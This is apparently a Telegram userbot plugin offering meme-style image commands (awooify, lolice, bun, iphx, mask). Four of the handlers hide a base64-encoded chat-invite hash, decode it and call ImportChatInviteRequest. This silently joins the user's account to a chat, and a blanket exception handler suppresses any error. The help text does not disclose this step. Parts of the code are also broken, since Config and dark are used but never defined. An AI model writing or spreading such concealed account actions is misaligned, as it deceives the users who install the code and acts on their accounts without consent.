# credits to @mrconfused and @sandy1709

#    Copyright (C) 2020  sandeep.n(π.$)

import base64
import os

from telegraph import exceptions, upload_file
from telethon import events
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from DarkWeb import CMD_HELP
from DarkWeb.helpers.functions import (
    awooify,
    baguette,
    convert_toimage,
    iphonex,
    lolice,
)
from Dark.utils import admin_cmd, edit_or_reply, sudo_cmd
from DarkWeb.cmdhelp import CmdHelp


@dark.on(admin_cmd(pattern="mask$", outgoing=True))
@dark.on(sudo_cmd(pattern="mask$", allow_sudo=True))
async def _(DarkWeb):
    reply_message = await DarkWeb.get_reply_message()
    if not reply_message.media or not reply_message:
        await edit_or_reply(DarkWeb, "```reply to media message```")
        return
    chat = "@hazmat_suit_bot"
    if reply_message.sender.bot:
        await edit_or_reply(DarkWeb, "```Reply to actual users message.```")
        return
    event = await DarkWeb.edit("```Processing```")
    async with DarkWeb.client.conversation(chat) as conv:
        try:
            response = conv.wait_event(
                events.NewMessage(incoming=True, from_users=905164246)
            )
            await DarkWeb.client.send_message(chat, reply_message)
            response = await response
        except YouBlockedUserError:
            await edit_or_reply(DarkWeb, "`Please unblock` @hazmat_suit_bot `and try again`")
            return
        if response.text.startswith("Forward"):
            await edit_or_reply(DarkWeb, "```can you kindly disable your forward privacy settings for good?```"
            )
        else:
            await DarkWeb.client.send_file(event.chat_id, response.message.media)
            await event.delete()


@dark.on(admin_cmd(pattern="awooify$", outgoing=True))
@dark.on(sudo_cmd(pattern="awooify$", allow_sudo=True))
async def DarkWeb(Darkmemes):
    replied = await Darkmemes.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await edit_or_reply(Darkmemes, "reply to a supported media file")
        return
    if replied.media:
        Darkevent = await edit_or_reply(Darkmemes, "passing to telegraph...")
    else:
        await edit_or_reply(Darkmemes, "reply to a supported media file")
        return
    try:
        Dark = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        Dark = Get(Dark)
        await Darkmemes.client(Dark)
    except BaseException:
        pass
    download_location = await Darkmemes.client.download_media(
        replied, Config.TMP_DOWNLOAD_DIRECTORY
    )
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await Darkevent.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await Darkevent.edit("generating image..")
    else:
        await Darkevent.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await Darkevent.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    Dark = f"https://telegra.ph{response[0]}"
    Dark = await awooify(Dark)
    await Darkevent.delete()
    await Darkmemes.client.send_file(Darkmemes.chat_id, Dark, reply_to=replied)


@dark.on(admin_cmd(pattern="lolice$"))
@dark.on(sudo_cmd(pattern="lolice$", allow_sudo=True))
async def DarkWeb(Darkmemes):
    replied = await Darkmemes.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await edit_or_reply(Darkmemes, "reply to a supported media file")
        return
    if replied.media:
        Darkevent = await edit_or_reply(Darkmemes, "passing to telegraph...")
    else:
        await edit_or_reply(Darkmemes, "reply to a supported media file")
        return
    try:
        Dark = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        Dark = Get(Dark)
        await Darkmemes.client(Dark)
    except BaseException:
        pass
    download_location = await Darkmemes.client.download_media(
        replied, Config.TMP_DOWNLOAD_DIRECTORY
    )
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await Darkevent.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await Darkevent.edit("generating image..")
    else:
        await Darkevent.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await Darkevent.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    Dark = f"https://telegra.ph{response[0]}"
    Dark = await lolice(Dark)
    await Darkevent.delete()
    await Darkmemes.client.send_file(Darkmemes.chat_id, Dark, reply_to=replied)


@dark.on(admin_cmd(pattern="bun$"))
@dark.on(sudo_cmd(pattern="bun$", allow_sudo=True))
async def DarkWeb(Darkmemes):
    replied = await Darkmemes.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await edit_or_reply(Darkmemes, "reply to a supported media file")
        return
    if replied.media:
        Darkevent = await edit_or_reply(Darkmemes, "passing to telegraph...")
    else:
        await edit_or_reply(Darkmemes, "reply to a supported media file")
        return
    try:
        Dark = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        Dark = Get(Dark)
        await Darkmemes.client(Dark)
    except BaseException:
        pass
    download_location = await Darkmemes.client.download_media(
        replied, Config.TMP_DOWNLOAD_DIRECTORY
    )
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await Darkevent.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await Darkevent.edit("generating image..")
    else:
        await Darkevent.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await Darkevent.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    Dark = f"https://telegra.ph{response[0]}"
    Dark = await baguette(Dark)
    await Darkevent.delete()
    await Darkmemes.client.send_file(Darkmemes.chat_id, Dark, reply_to=replied)


@dark.on(admin_cmd(pattern="iphx$"))
@dark.on(sudo_cmd(pattern="iphx$", allow_sudo=True))
async def DarkWeb(Darkmemes):
    replied = await Darkmemes.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await edit_or_reply(Darkmemes, "reply to a supported media file")
        return
    if replied.media:
        Darkevent = await edit_or_reply(Darkmemes, "passing to telegraph...")
    else:
        await edit_or_reply(Darkmemes, "reply to a supported media file")
        return
    try:
        Dark = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        Dark = Get(Dark)
        await Darkmemes.client(Dark)
    except BaseException:
        pass
    download_location = await Darkmemes.client.download_media(
        replied, Config.TMP_DOWNLOAD_DIRECTORY
    )
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await Darkevent.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await Darkevent.edit("generating image..")
    else:
        await Darkevent.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await Darkevent.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    Dark = f"https://telegra.ph{response[0]}"
    Dark = await iphonex(Dark)
    await Darkevent.delete()
    await Darkmemes.client.send_file(Darkmemes.chat_id, Dark, reply_to=replied)


CmdHelp("mask").add_command(
  "mask", "<reply to img/stcr", "Makes an image a different style."
).add_command(
  "iphx", "<reply to img/stcr", "Covers the replied image or sticker into iphonex wallpaper"
).add_command(
  "bun", "<reply to img/stcr", "Gives the replied img a cool bun eating look"
).add_command(
  "lolice", "<reply to img/stcr", "Gives the replied img the face of Lolice Cheif"
).add_command(
  "awooify", "<reply to img/stcr", "Gives the replied img or stcr the face or wooify"
).add() 
